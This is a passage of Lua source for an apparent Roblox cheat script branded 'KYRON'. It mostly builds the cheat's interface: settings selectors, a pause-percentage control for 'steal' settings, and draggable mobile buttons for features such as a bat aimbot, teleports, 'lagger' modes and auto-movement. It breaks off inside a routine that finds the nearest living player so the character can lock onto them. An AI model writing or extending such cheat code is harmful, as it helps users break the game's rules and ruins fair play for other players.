          textBox.BackgroundColor3 = tbl37.key
          textBox.BackgroundTransparency = 0.15
          textBox.BorderSizePixel = 0
          textBox.ClearTextOnFocus = false
          textBox.Text = tostring(arg3)
          textBox.TextColor3 = tbl37.text
          textBox.TextSize = 12
          textBox.Font = Enum.Font.GothamBlack
          textBox.Size = UDim2.new(0, 58, 0, 25)
          textBox.Position = UDim2.new(1, -94, 0.5, -12)
          textBox.ZIndex = 31
          fn56(textBox, 7)
          fn57(textBox, 1)
          local v94 = createTextButton(v92, ">", 28)
          v94.Name = "Plus"
          v94.Font = Enum.Font.GothamBlack
          v94.Position = UDim2.new(1, -40, 0.5, -16)
          local n34 = math.clamp(tonumber(arg3) or arg4, arg4, arg5)

          local function fn67(arg8, arg9)
            n34 = math.clamp(math.floor((tonumber(arg8) or n34) + 0.5), arg4, arg5)
            textBox.Text = tostring(n34)

            if not arg9 and arg7 then
              pcall(arg7, n34)
            end

            return n34
          end

          v93.Activated:Connect(function()
            fn67(n34 - arg6)
          end)

          v94.Activated:Connect(function()
            fn67(n34 + arg6)
          end)

          textBox.FocusLost:Connect(function()
            fn67(textBox.Text)
          end)

          return v92, textBox, fn67
        end

        -- Settings widgets and the normal-pause selector.
        _G._KYRONBuildNormalPauseSelector = function(arg)
          local v92 = fn63(arg, "Normal Pause %")
          local frame4 = Instance.new("Frame")
          frame4.Name = "PausePercentPill"
          frame4.Size = UDim2.new(0, 98, 0, 24)
          frame4.Position = UDim2.new(1, -104, 0.5, -12)
          frame4.ZIndex = 30
          frame4.Parent = v92
          createUIStroke(frame4)
          local v93 = createTextButton(v92, "<", 24)
          v93.Name = "PausePercentPrev"
          v93.Parent = frame4
          fn62(v93, UDim2.new(0, 24, 1, 0), UDim2.new(0, 1, 0, 0))
          local v94 = createTextButton(v92, "75%", 46)
          v94.Name = "PausePercentValue"
          v94.Parent = frame4
          local udim22 = UDim2.new
          fn62(v94, UDim2.new(0, 48, 1, 0), udim22(0, 25, 0, 0))
          local v95 = createTextButton(v92, ">", 24)
          v95.Name = "PausePercentNext"
          v95.Parent = frame4
          local udim23 = UDim2.new
          local v96 = 0
          fn62(v95, UDim2.new(0, 24, 1, 0), udim23(1, -25, v96, 0))
          local KYRONNormalPauseOptions = _G._KYRONNormalPauseOptions
          local n34 = 1

          local function KYRONSetNormalPauseSelector(arg2, arg3)
            local v97 = _G._KYRONNormalizeNormalPausePercent(arg2)

            for i, KYRONNormalPauseOption in ipairs(KYRONNormalPauseOptions) do
              if KYRONNormalPauseOption == v97 then
                n34 = i
                break
              end
            end

            normalStealSettings.NormalStealPausePercent = KYRONNormalPauseOptions[n34]
            v94.Text = tostring(normalStealSettings.NormalStealPausePercent) .. "%"

            if not arg3 and autoSaveSettings.auto then
              task.spawn(function()
                pcall(saveKYRONSettings)
              end)
            end

            return normalStealSettings.NormalStealPausePercent
          end

          v93.Activated:Connect(function()
            n34 = (n34 - 2) % #KYRONNormalPauseOptions + 1
            KYRONSetNormalPauseSelector(KYRONNormalPauseOptions[n34])
          end)

          v95.Activated:Connect(function()
            n34 = n34 % #KYRONNormalPauseOptions + 1
            KYRONSetNormalPauseSelector(KYRONNormalPauseOptions[n34])
          end)

          v94.Activated:Connect(function()
            n34 = n34 % #KYRONNormalPauseOptions + 1
            KYRONSetNormalPauseSelector(KYRONNormalPauseOptions[n34])
          end)

          _G._KYRONSetNormalPauseSelector = KYRONSetNormalPauseSelector
          KYRONSetNormalPauseSelector(normalStealSettings.NormalStealPausePercent, true)
          return v92
        end

        local function createFrame(parent, text, text2)
          local frame4 = Instance.new("Frame")
          frame4.BackgroundColor3 = tbl37.row
          frame4.BackgroundTransparency = 0.3
          frame4.BorderSizePixel = 0
          frame4.Size = UDim2.new(1, -4, 0, 34)
          frame4.ZIndex = 3
          frame4.Parent = parent
          createUIStroke(frame4)
          local frame5 = Instance.new("Frame")
          frame5.BackgroundColor3 = tbl37.accent
          frame5.BackgroundTransparency = 0.85
          frame5.BorderSizePixel = 0
          frame5.Size = UDim2.new(0.5, -4, 1, -8)
          frame5.Position = UDim2.new(0, 4, 0, 4)
          frame5.ZIndex = 4
          frame5.Parent = frame4
          fn56(frame5, 8)
          local v92, v93 = fn57(frame5, 1)
          v93.Color = v78
          v93.Transparency = v82
          local textButton2 = Instance.new("TextButton")
          textButton2.BackgroundTransparency = 1
          textButton2.Text = text
          textButton2.TextColor3 = tbl37.text
          textButton2.TextSize = 16
          textButton2.Font = Enum.Font.GothamMedium
          textButton2.Size = UDim2.new(0.5, 0, 1, 0)
          textButton2.AutoButtonColor = false
          textButton2.ZIndex = 5
          textButton2.Parent = frame4
          local clone = textButton2:Clone()
          clone.Text = text2
          clone.Position = UDim2.new(0.5, 0, 0, 0)
          clone.Parent = frame4

          textButton2.Activated:Connect(function()
            TweenService:Create(frame5, TweenInfo.new(0.14), { Position = UDim2.new(0, 4, 0, 4) }):Play()
          end)

          clone.Activated:Connect(function()
            TweenService:Create(frame5, TweenInfo.new(0.14), { Position = UDim2.new(0.5, 0, 0, 4) }):Play()
          end)

          return frame4
        end

        local function fn67(arg, arg2, arg3)
          arg2.Visible = false
          arg2.Size = UDim2.new(1, -4, 0, 0)
          arg2.ClipsDescendants = true
          local flag29 = false
          local n34 = 0

          arg3.Activated:Connect(function()
            flag29 = not flag29
            n34 += 1
            local v92 = n34
            arg2.Visible = true
            tbl38.expanded(arg3, flag29)

            tbl38
              .tween(arg2, "expand", 0.18, {
                Size = flag29 and UDim2.new(1, -4, 0, 34) or UDim2.new(1, -4, 0, 0),
              }).Completed
              :Once(function()
                if n34 == v92 and not flag29 then
                  arg2.Visible = false
                end
              end)
          end)
        end

        local function fn68(arg, arg2, arg3, arg4, arg5)
          local tbl44 = arg5 or {}
          tbl44.arrow = true
          local v92 = fn63(arg, arg2, tbl44)
          local v93 = createFrame(arg, arg3, arg4)
          local arrowButton = v92:FindFirstChild("ArrowButton")

          if arrowButton then
            fn67(v92, v93, arrowButton)
          end

          return v92, v93
        end

        local function fn69(parent)
          local frame4 = Instance.new("Frame")
          frame4.Name = "Custom Sky"
          frame4.BackgroundTransparency = 1
          frame4.BorderSizePixel = 0
          frame4.Size = UDim2.new(1, -4, 0, 52)
          frame4.ZIndex = 3
          frame4.Parent = parent
          local gothamBlack = Enum.Font.GothamBlack
          local text = tbl37.text
          local customSky = fn58(frame4, "Custom Sky", 12, UDim2.new(0, 2, 0, 0), gothamBlack, text)
          customSky.Size = UDim2.new(1, 0, 0, 16)
          customSky.ZIndex = 4
          local instance6 = Instance.new("Frame")
          instance6.Name = "CustomSkyPill"
          instance6.BackgroundTransparency = 1
          instance6.BorderSizePixel = 0
          instance6.Size = UDim2.new(1, 0, 0, 28)
          instance6.Position = UDim2.new(0, 0, 0, 22)
          instance6.ZIndex = 5
          instance6.Parent = frame4
          createUIStroke(instance6)
          local v92 = createTextButton(frame4, "<", 44)
          v92.Parent = instance6
          local udim22 = UDim2.new
          local v93 = 0
          fn62(v92, UDim2.new(0, 34, 1, 0), udim22(v93, 4, 0, 0))
          local off = createTextButton(frame4, "OFF", 0)
          off.Parent = instance6
          local udim23 = UDim2.new
          local v94 = 0
          fn62(off, UDim2.new(1, -84, 1, 0), udim23(0, 42, 0, v94))
          local v95 = createTextButton(frame4, ">", 45)
          v95.Parent = instance6
          local udim24 = UDim2.new
          local v96 = 0
          fn62(v95, UDim2.new(0, 34, 1, 0), udim24(1, -38, 0, v96))
        end

        KYRONMobileBtnLocked = true
        _G._KYRONMobileBtnLocked = KYRONMobileBtnLocked
        tbl43 = {}
        local frame4 = Instance.new("Frame")
        frame4.Name = "MobileButtons"
        frame4.BackgroundTransparency = 1
        frame4.BorderSizePixel = 0
        frame4.Size = UDim2.new(1, 0, 1, 0)
        -- Must NOT swallow touches meant for Roblox chat / leave / topbar.
        frame4.Active = false
        frame4.Selectable = false
        pcall(function()
          frame4.Interactable = false
        end)
        frame4.Parent = screenGui

        local function KYRONApplyMobileButtonsHidden()
          frame4.Visible = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and _G._KYRONMobileButtonsHidden ~= true
          local KYRONHiddenMobileButtons = _G._KYRONHiddenMobileButtons or {}

          for _, v92 in ipairs(tbl43) do
            v92.Visible = KYRONHiddenMobileButtons[v92.Name] ~= true and (not (v92.Name == "Lagger Carry") or _G._KYRONAdvancedLaggerButton == true)
            -- Only the individual buttons capture input, not the full-screen holder.
            v92.Active = true
            pcall(function()
              v92.Interactable = true
            end)

            if v92.Name == "Lagger Mode" then
              local textLabel = v92:FindFirstChildWhichIsA("TextLabel", true)

              if textLabel then
                textLabel.Text = _G._KYRONAdvancedLaggerButton == true and "LAGGER NORM" or "LAGGER MODE"
              end
            end
          end

          if _G._KYRONApplyButtonImagePickerVisibility then
            pcall(_G._KYRONApplyButtonImagePickerVisibility)
          end
        end

        -- Mobile button profiles, visibility, and placement.
        _G._KYRONApplyMobileButtonsHidden = KYRONApplyMobileButtonsHidden
        _G._KYRONApplySpecificMobileButtonHiding = KYRONApplyMobileButtonsHidden
        KYRONApplyMobileButtonsHidden()

        _G._KYRONLegacyKeepMobileButtonOnScreen = function(arg, position2)
          task.spawn(function()
            for i = 1, 2 do
              RunService.RenderStepped:Wait()
            end

            local currentCamera = workspace.CurrentCamera
            if not currentCamera or not arg.Parent then
              return
            end
            local viewportSize = currentCamera.ViewportSize
            local absolutePosition = arg.AbsolutePosition
            local absoluteSize = arg.AbsoluteSize
            if viewportSize.X <= 0 or viewportSize.Y <= 0 then
              return
            end

            if absolutePosition.X < -absoluteSize.X + 24 or absolutePosition.Y < -absoluteSize.Y + 24 or absolutePosition.X > viewportSize.X - 24 or absolutePosition.Y > viewportSize.Y - 24 then
              arg.Position = position2

              if _G._KYRONMobileBtnPos then
                _G._KYRONMobileBtnPos[arg.Name] = nil
              end
            end
          end)
        end

        local function fn70(arg)
          local currentCamera = workspace.CurrentCamera
          if not currentCamera then
            return
          end
          local viewportSize = currentCamera.ViewportSize
          if viewportSize.X <= 0 or viewportSize.Y <= 0 then
            return
          end
          _G._KYRONMobileBtnPos = _G._KYRONMobileBtnPos or {}
          _G._KYRONMobileBtnPositions = _G._KYRONMobileBtnPositions or {}
          _G._KYRONMobileBtnPositions[_G._KYRONMobilePositionProfile or "desktop"] = _G._KYRONMobileBtnPos

          _G._KYRONMobileBtnPos[arg.Name] = {
            xs = arg.Position.X.Scale,
            xo = arg.Position.X.Offset,
            ys = arg.Position.Y.Scale,
            yo = arg.Position.Y.Offset,
            vw = viewportSize.X,
            vh = viewportSize.Y,
            nx = arg.AbsolutePosition.X / viewportSize.X,
            ny = arg.AbsolutePosition.Y / viewportSize.Y,
          }
        end

        local function fn71(arg, arg2)
          if type(arg2) ~= "table" then
            return false
          end
          local currentCamera = workspace.CurrentCamera
          currentCamera = currentCamera and currentCamera.ViewportSize
          local flag29 = currentCamera and type(arg2.vw) == "number" and type(arg2.vh) == "number" and math.abs(currentCamera.X - arg2.vw) < 1
          local flag30

          if flag29 then
            local v92 = 1
            flag30 = math.abs(currentCamera.Y - arg2.vh) < v92
          else
            flag30 = flag29
          end

          if flag30 and type(arg2.xs) == "number" and type(arg2.ys) == "number" then
            arg.Position = UDim2.new(arg2.xs, arg2.xo or 0, arg2.ys, arg2.yo or 0)
            return true
          end

          if type(arg2.nx) == "number" and type(arg2.ny) == "number" then
            arg.Position = UDim2.new(arg2.nx, 0, arg2.ny, 0)
            return true
          end

          if type(arg2.xs) == "number" and type(arg2.ys) == "number" then
            arg.Position = UDim2.new(arg2.xs, arg2.xo or 0, arg2.ys, arg2.yo or 0)
            return true
          end
          return false
        end

        local uiScale2 = Instance.new("UIScale")
        uiScale2.Scale = 1
        uiScale2.Parent = frame4
        flag28 = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
        KYRONMobilePositionProfile = flag28 and "touch" or "desktop"
        _G._KYRONMobilePositionProfile = KYRONMobilePositionProfile
        _G._KYRONMobileBtnPositions = _G._KYRONMobileBtnPositions or {}
        local flag29 = not _G._KYRONMobileBtnPositions.desktop

        if flag29 then
          flag29 = type(_G._KYRONLegacyDesktopBtnPos) == "table"
        end

        if flag29 then
          _G._KYRONMobileBtnPositions.desktop = _G._KYRONLegacyDesktopBtnPos
        end

        _G._KYRONMobileBtnPositions[KYRONMobilePositionProfile] = _G._KYRONMobileBtnPositions[KYRONMobilePositionProfile] or {}
        _G._KYRONMobileBtnPos = _G._KYRONMobileBtnPositions[KYRONMobilePositionProfile]
        -- Keep every saved floating-button position (including Auto Left).
        _G._KYRONHiddenMobileButtons = _G._KYRONHiddenMobileButtons or {}

        _G._KYRONCaptureMobileButtonPositions = function()
          _G._KYRONMobileBtnPositions[KYRONMobilePositionProfile] = _G._KYRONMobileBtnPositions[KYRONMobilePositionProfile] or {}
          _G._KYRONMobileBtnPos = _G._KYRONMobileBtnPositions[KYRONMobilePositionProfile]

          for _, v92 in ipairs(tbl43) do
            if v92 and v92.Parent then
              fn70(v92)
            end
          end
        end

        -- Re-apply all saved floating button positions after creation / resize.
        _G._KYRONApplyMobileButtonPositions = function()
          _G._KYRONMobileBtnPositions = _G._KYRONMobileBtnPositions or {}
          local profile = _G._KYRONMobilePositionProfile or KYRONMobilePositionProfile or "desktop"
          local saved = _G._KYRONMobileBtnPositions[profile]
          if type(saved) ~= "table" then
            return
          end
          _G._KYRONMobileBtnPos = saved
          for _, v92 in ipairs(tbl43) do
            if v92 and v92.Parent and type(saved[v92.Name]) == "table" then
              pcall(fn71, v92, saved[v92.Name])
            end
          end
        end

        local function fn72(arg, arg2)
          local v92 = ({
            ["TP Bat"] = { col = 1, row = 1 },
            ["Lagger Mode"] = { col = 2, row = 2 },
            ["Lagger Carry"] = { col = 3, row = 2 },
            ["TP Down"] = { col = 2, row = 3 },
            ["Carry Speed"] = { col = 3, row = 3 },
            ["Bat Aimbot"] = { col = 2, row = 4 },
            ["Auto Right"] = { col = 3, row = 4 },
            ["Drop Brainrot"] = { col = 2, row = 5 },
            ["Auto Left"] = { col = 3, row = 5 },
            ["Insta Reset"] = { col = 2, row = 6 },
          })[arg2]

          if v92 then
            local n34 = 60

            if flag28 then
              n34 = math.max(60, math.floor(52 * (_G._KYRONMobileBtnScale or 1) + 0.5) + 8)
            end

            return UDim2.new(1, (v92.col - 4) * n34, 0.5, -161 + (v92.row - 1) * n34)
          end

          return UDim2.new(1, -132 + (arg - 1) % 2 * 66, 0.5, -161 + math.floor((arg - 1) / 2) * 66)
        end

        local function createTextButton3(name, arg)
          local tbl44 = ({
            ["TP Bat"] = { col = 0, row = 0 },
            ["Lagger Mode"] = { col = 1, row = 1 },
            ["Lagger Carry"] = { col = 2, row = 1 },
            ["TP Down"] = { col = 1, row = 2 },
            ["Carry Speed"] = { col = 2, row = 2 },
            ["Bat Aimbot"] = { col = 1, row = 3 },
            ["Auto Right"] = { col = 2, row = 3 },
            ["Drop Brainrot"] = { col = 1, row = 4 },
            ["Auto Left"] = { col = 2, row = 4 },
            ["Insta Reset"] = { col = 1, row = 5 },
          })[name] or { col = (arg - 1) % 3, row = math.floor((arg - 1) / 3) }

          local col = tbl44.col
          local row = tbl44.row
          local textButton2 = Instance.new("TextButton")
          textButton2.Name = name
          textButton2.BackgroundTransparency = 1
          textButton2.Text = ""
          textButton2.Size = UDim2.new(0, 52, 0, 50)
          textButton2.Position = fn72(arg, name)
          textButton2.AutoButtonColor = false
          textButton2.ClipsDescendants = true
          textButton2.Parent = frame4
          local v92 = fn56(textButton2, _G._KYRONCircleButtons and 26 or 10)
          local uiScale3 = Instance.new("UIScale")
          uiScale3.Scale = _G._KYRONMobileBtnScale or 1
          uiScale3.Parent = textButton2
          local canvasGroup = Instance.new("CanvasGroup")
          canvasGroup.Name = "RoundedVisualMask"
          canvasGroup.BackgroundColor3 = Color3.fromRGB(2, 2, 10)
          canvasGroup.BackgroundTransparency = 0
          canvasGroup.BorderSizePixel = 0
          canvasGroup.Size = UDim2.fromScale(1, 1)
          canvasGroup.ClipsDescendants = true
          canvasGroup.ZIndex = 1
          canvasGroup.Parent = textButton2
          local v93 = fn56(canvasGroup, _G._KYRONCircleButtons and 26 or 10)
          local imageLabel = Instance.new("ImageLabel")
          imageLabel.BackgroundTransparency = 1
          imageLabel.Image = "rbxassetid://88369503310562"
          imageLabel.ScaleType = Enum.ScaleType.Stretch
          imageLabel.ImageRectSize = Vector2.new(128, 96)
          imageLabel.ImageRectOffset = Vector2.new(col * 128, row * 96)
          imageLabel.Size = UDim2.new(1, 0, 1, 0)
          imageLabel.Position = UDim2.new(0, 0, 0, 0)
          imageLabel.ZIndex = 1
          imageLabel.Parent = canvasGroup
          local v94 = fn56(imageLabel, _G._KYRONCircleButtons and 26 or 10)
          local imageLabel2 = Instance.new("ImageLabel")
          imageLabel2.BackgroundTransparency = 1
          imageLabel2.Image = "rbxassetid://88369503310562"
          imageLabel2.ScaleType = Enum.ScaleType.Stretch
          imageLabel2.ImageRectSize = Vector2.new(128, 96)
          imageLabel2.ImageRectOffset = Vector2.new(col * 128, row * 96)
          imageLabel2.ImageColor3 = Color3.fromRGB(255, 240, 255)
          imageLabel2.BorderSizePixel = 0
          imageLabel2.Size = UDim2.new(1, 0, 1, 0)
          imageLabel2.ZIndex = 2
          imageLabel2.Parent = canvasGroup
          local v95 = fn56(imageLabel2, _G._KYRONCircleButtons and 26 or 10)
          local instance6 = Instance.new("UIGradient")
          instance6.Name = "NoneBackgroundActiveShine"
          local colorSequence = ColorSequence.new
          local tbl45 = {}
          local v96 = ColorSequenceKeypoint.new(0, Color3.fromRGB(240, 240, 240))
          local v97 = ColorSequenceKeypoint.new(0.32, Color3.fromRGB(238, 238, 244))
          local v98 = ColorSequenceKeypoint.new(0.68, Color3.fromRGB(184, 184, 194))
          local new = ColorSequenceKeypoint.new
          local color2 = Color3.fromRGB
          tbl45[1] = v96
          tbl45[2] = v97
          tbl45[3] = v98

          do
            local values = table.pack(new(1, color2(82, 82, 92)))
            table.move(values, 1, values.n, 4, tbl45)
          end

          instance6.Color = colorSequence(tbl45)
          instance6.Rotation = 90
          instance6.Enabled = false
          instance6.Parent = imageLabel2
          local str10 = name == "Drop Brainrot" and "DROP BR" or (name == "Auto Left" and "AUTO\nLEFT" or string.upper(name))
          local gothamBlack = Enum.Font.GothamBlack
          local text = tbl37.text
          local center = Enum.TextXAlignment.Center
          local v99 = fn58(canvasGroup, str10, 9, UDim2.new(0, 4, 0, 0), gothamBlack, text, center)
          v99.Size = UDim2.new(1, -8, 1, 0)
          v99.TextWrapped = true
          v99.AutoLocalize = false
          v99.ZIndex = 3
          local uiStroke = Instance.new("UIStroke")
          uiStroke.Color = Color3.fromRGB(0, 0, 0)
          uiStroke.Thickness = 1.4
          uiStroke.Transparency = 1
          uiStroke.Parent = v99
          local v100, v101 = fn57(textButton2, 1.1)
          local flag30 = false

          local function fn73(arg2)
            local flag31 = arg2 == "secondary"
            flag30 = arg2 == true or flag31
            local v102 = true
            local flag32 = imageLabel:GetAttribute("_KYRONNoButtonImage") == v102
            instance6.Enabled = flag32 and flag30

            if flag32 then
              local v103 = instance6
              local colorSequence2

              if flag31 then
                local new2 = ColorSequenceKeypoint.new
                local v104 = 1
                local color3 = Color3.fromRGB

                colorSequence2 = ColorSequence.new({
                  ColorSequenceKeypoint.new(0, Color3.fromRGB(140, 140, 158)),
                  new2(v104, color3(68, 68, 76)),
                })
              else
                colorSequence2 = flag31
              end

              if not colorSequence2 then
                local colorSequence3 = ColorSequence.new
                local tbl46 = {}
                local v104 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255))
                local v105 = ColorSequenceKeypoint.new(0.3, Color3.fromRGB(238, 238, 244))
                local v106 = ColorSequenceKeypoint.new(0.68, Color3.fromRGB(184, 184, 194))
                local new2 = ColorSequenceKeypoint.new
                local color3 = Color3.fromRGB
                tbl46[1] = v104
                tbl46[2] = v105
                tbl46[3] = v106

                do
                  local values = table.pack(new2(1, color3(82, 82, 92)))
                  table.move(values, 1, values.n, 4, tbl46)
                end

                colorSequence2 = colorSequence3(tbl46)
              end

              v103.Color = colorSequence2
            end

            local KYRONGetButtonImageTint = _G._KYRONGetButtonImageTint and _G._KYRONGetButtonImageTint() or _G._KYRONAccent or Color3.fromRGB(255, 255, 255)
            local selectedButtonColor = _G._KYRONAccent or KYRONGetButtonImageTint
            imageLabel2.BackgroundColor3 = selectedButtonColor
            imageLabel2.BackgroundTransparency = flag30 and 0 or 1
            imageLabel2.ImageTransparency = 1
            imageLabel.ImageTransparency = 1
            imageLabel.ImageColor3 = KYRONGetButtonImageTint
            imageLabel2.ImageColor3 = selectedButtonColor
            uiStroke.Transparency = 1
            v100.Thickness = flag30 and not flag32 and 10 or 1.1
            v100.Color = flag30 and Color3.fromRGB(240, 255, 255) or Color3.fromRGB(255, 255, 240)
            v100.Transparency = flag32 and 1 or flag30 and 0 or 1
            v101.Color = flag30 and v78 or v79
            v101.Transparency = flag30 and v82 or v83
            v99.TextColor3 = flag30 and flag32 and Color3.fromRGB(8, 24, 16) or Color3.fromRGB(255, 255, 255)
            local v103 = v99
            local v104 = flag30

            if not flag30 then
              flag32 = v104
            end

            v103.TextTransparency = flag32 and 0.14 or 0
          end

          _G._KYRONMobileBtnSetActive = _G._KYRONMobileBtnSetActive or {}
          _G._KYRONMobileBtnSetActive[name] = fn73
          _G._KYRONMobileBtnGetActive = _G._KYRONMobileBtnGetActive or {}

          _G._KYRONMobileBtnGetActive[name] = function()
            return flag30
          end

          textButton2.Activated:Connect(function()
            if not KYRONMobileBtnLocked then
              return
            end
          end)

          local v102 = nil
          local position2 = nil
          local position3 = nil
          local flag31 = false
          local flag32 = false
          local connection2 = nil
          local flag33 = false

          local function fn74()
            if flag33 then
              return
            end
            flag33 = true

            task.delay(0.25, function()
              flag33 = false

              if _G._KYRONSaveButtonPlacements then
                pcall(_G._KYRONSaveButtonPlacements)
              end
            end)
          end

          local function fn75()
            if not flag31 then
              return
            end
            flag31 = false
            v102 = nil

            if connection2 then
              connection2:Disconnect()
              connection2 = nil
            end

            if flag32 then
              fn70(textButton2)
              if type(_G._KYRONCaptureMobileButtonPositions) == "function" then
                pcall(_G._KYRONCaptureMobileButtonPositions)
              end

              if _G._KYRONSaveButtonPlacements then
                pcall(_G._KYRONSaveButtonPlacements, true)
              elseif type(saveKYRONSettings) == "function" then
                pcall(saveKYRONSettings, true)
              end
            end
          end

          textButton2.InputBegan:Connect(function(input)
            if KYRONMobileBtnLocked then
              return
            end

            if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
              return
            end
            flag31 = true
            flag32 = false
            v102 = input
            position2 = input.Position
            position3 = textButton2.Position

            if connection2 then
              connection2:Disconnect()
            end

            connection2 = input.Changed:Connect(function()
              if input.UserInputState == Enum.UserInputState.End then
                fn75()
              end
            end)
          end)

          UserInputService.InputEnded:Connect(function(input)
            if input == v102 then
              fn75()
            end
          end)

          UserInputService.InputChanged:Connect(function(input)
            if KYRONMobileBtnLocked or not flag31 then
              return
            end

            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
              local n34 = input.Position - position2

              if not flag32 then
                local flag34 = math.abs(n34.X) < 6

                if flag34 then
                  local v103 = 5
                  flag34 = math.abs(n34.Y) < v103
                end

                if flag34 then
                  return
                end
                flag32 = true
              end

              textButton2.Position = UDim2.new(position3.X.Scale, position3.X.Offset + n34.X, position3.Y.Scale, position3.Y.Offset + n34.Y)
              fn70(textButton2)
              fn74()
            end
          end)

          if _G._KYRONMobileBtnPos and _G._KYRONMobileBtnPos[name] then
            fn71(textButton2, _G._KYRONMobileBtnPos[name])
          end

          textButton2:GetPropertyChangedSignal("Position"):Connect(function()
            if flag31 then
              fn70(textButton2)
              fn74()
            end
          end)

          _G._KYRONBtnImages = _G._KYRONBtnImages or {}

          table.insert(_G._KYRONBtnImages, {
            button = textButton2,
            bg = imageLabel,
            glow = imageLabel2,
            buttonCorner = v92,
            mask = canvasGroup,
            maskCorner = v93,
            bgCorner = v94,
            glowCorner = v95,
            col = col,
            rowIndex = row,
            span = 1,
            index = arg,
            isWide = false,
            refresh = function()
              fn73(flag30)
            end,
          })

          tbl43[#tbl43 + 1] = textButton2
          return textButton2
        end

        for i, v92 in ipairs({
          "Drop Brainrot",
          "Auto Left",
          "Bat Aimbot",
          "Auto Right",
          "TP Down",
          "TP Bat",
          "Carry Speed",
          "Lagger Mode",
          "Lagger Carry",
          "Insta Reset",
        }) do
          createTextButton3(v92, i)
        end

        -- Force-apply saved floating button positions after all buttons exist.
        if _G._KYRONApplyMobileButtonPositions then
          pcall(_G._KYRONApplyMobileButtonPositions)
          task.defer(function()
            pcall(_G._KYRONApplyMobileButtonPositions)
          end)
          task.delay(0.35, function()
            pcall(_G._KYRONApplyMobileButtonPositions)
          end)
        end

        -- Explicitly restore the requested Auto Left button and its default slot.
        local autoLeftButton = frame4:FindFirstChild("Auto Left")
        if autoLeftButton then
          autoLeftButton.Visible = true
          autoLeftButton.Position = fn72(2, "Auto Left")
        end
        KYRONApplyMobileButtonsHidden()
        local flag30 = false

        local function fn73()
          if flag30 then
            return
          end
          flag30 = true

          task.delay(0.12, function()
            flag30 = false

            for _, v92 in ipairs(tbl43) do
              local KYRONMobileBtnPos = _G._KYRONMobileBtnPos and _G._KYRONMobileBtnPos[v92.Name]

              if KYRONMobileBtnPos then
                fn71(v92, KYRONMobileBtnPos)
              end
            end
          end)
        end

        task.spawn(function()
          local currentCamera = workspace.CurrentCamera

          if currentCamera then
            currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn73)
          end

          workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
            local currentCamera2 = workspace.CurrentCamera

            if currentCamera2 then
              currentCamera2:GetPropertyChangedSignal("ViewportSize"):Connect(fn73)
              fn73()
            end
          end)
        end)

        fn65 = function()
          for i, v92 in ipairs(tbl43) do
            v92.Position = fn72(i, v92.Name)
          end
        end

        local function KYRONApplyMobileButtonShape()
          local flag31 = _G._KYRONCircleButtons == true
          local v92 = ipairs
          local KYRONBtnImages = _G._KYRONBtnImages or {}

          for _, KYRONBtnImage in v92(KYRONBtnImages) do
            if KYRONBtnImage.button then
              KYRONBtnImage.button.ClipsDescendants = true
              KYRONBtnImage.button.Size = UDim2.new(0, KYRONBtnImage.isWide and 104 or 52, 0, 52)
            end

            local n34 = flag31 and 26 or 12

            if KYRONBtnImage.buttonCorner then
              KYRONBtnImage.buttonCorner.CornerRadius = UDim.new(0, n34)
            end

            if KYRONBtnImage.mask then
              KYRONBtnImage.mask.ClipsDescendants = true
            end

            if KYRONBtnImage.maskCorner then
              KYRONBtnImage.maskCorner.CornerRadius = UDim.new(0, n34)
            end

            if KYRONBtnImage.bg then
              KYRONBtnImage.bg.ClipsDescendants = true
            end

            if KYRONBtnImage.glow then
              KYRONBtnImage.glow.ClipsDescendants = true
            end

            if KYRONBtnImage.bgCorner then
              KYRONBtnImage.bgCorner.CornerRadius = UDim.new(0, n34)
            end

            if KYRONBtnImage.glowCorner then
              KYRONBtnImage.glowCorner.CornerRadius = UDim.new(0, n34)
            end

            if KYRONBtnImage.refresh then
              KYRONBtnImage.refresh()
            end
          end

          local KYRONRefreshButtonImages = _G._KYRONRefreshButtonImages

          if type(KYRONRefreshButtonImages) == "function" then
            pcall(KYRONRefreshButtonImages)
          end
        end

        _G._KYRONApplyMobileButtonShape = KYRONApplyMobileButtonShape
        KYRONApplyMobileButtonShape()

        createTextButton2 = function(parent, arg)
          local textButton2 = Instance.new("TextButton")
          textButton2.BackgroundTransparency = 1
          textButton2.Text = ""
          textButton2.Size = UDim2.new(1, 0, 1, 0)
          textButton2.ZIndex = 30
          textButton2.AutoButtonColor = false
          textButton2.Parent = parent
          textButton2.Activated:Connect(arg)
          return textButton2
        end

        local function fn74()
          _G._KYRONLookAtEnemyEnabled = _G._KYRONLookAtEnemyEnabled == true
          _G._KYRONLookAtEnemyRadius = math.clamp(tonumber(_G._KYRONLookAtEnemyRadius) or 20, 1, 200)

          if _G._KYRONLookAtEnemy and _G._KYRONLookAtEnemy.Stop then
            pcall(_G._KYRONLookAtEnemy.Stop)
          end

          local KYRONLookAtEnemy = { conn = nil, diedConn = nil, anchor = nil, align = nil, attachment = nil }
          _G._KYRONLookAtEnemy = KYRONLookAtEnemy

          local function stop()
            if KYRONLookAtEnemy.conn then
              KYRONLookAtEnemy.conn:Disconnect()
              KYRONLookAtEnemy.conn = nil
            end

            if KYRONLookAtEnemy.diedConn then
              KYRONLookAtEnemy.diedConn:Disconnect()
              KYRONLookAtEnemy.diedConn = nil
            end

            if KYRONLookAtEnemy.align then
              KYRONLookAtEnemy.align:Destroy()
              KYRONLookAtEnemy.align = nil
            end

            if KYRONLookAtEnemy.attachment then
              KYRONLookAtEnemy.attachment:Destroy()
              KYRONLookAtEnemy.attachment = nil
            end

            if KYRONLookAtEnemy.anchor then
              KYRONLookAtEnemy.anchor:Destroy()
              KYRONLookAtEnemy.anchor = nil
            end

            local character = localPlayer.Character
            local v92 = character and character:FindFirstChildOfClass("Humanoid")

            if v92 then
              v92.AutoRotate = true
            end
          end

          local function fn75()
            local character = localPlayer.Character
            character = character and character:FindFirstChild("HumanoidRootPart")
            if not character then
              return nil
            end
            local huge = math.huge
            local v92 = nil

            for _, player in ipairs(Players:GetPlayers()) do
              if player ~= localPlayer then
                local character2 = player.Character
                local humanoidRootPart = character2 and character2:FindFirstChild("HumanoidRootPart")
                character2 = character2 and character2:FindFirstChildOfClass("Humanoid")

                if humanoidRootPart and character2 and character2.Health > 0 then
                  local magnitude = (character.Position - humanoidRootPart.Position).Magnitude

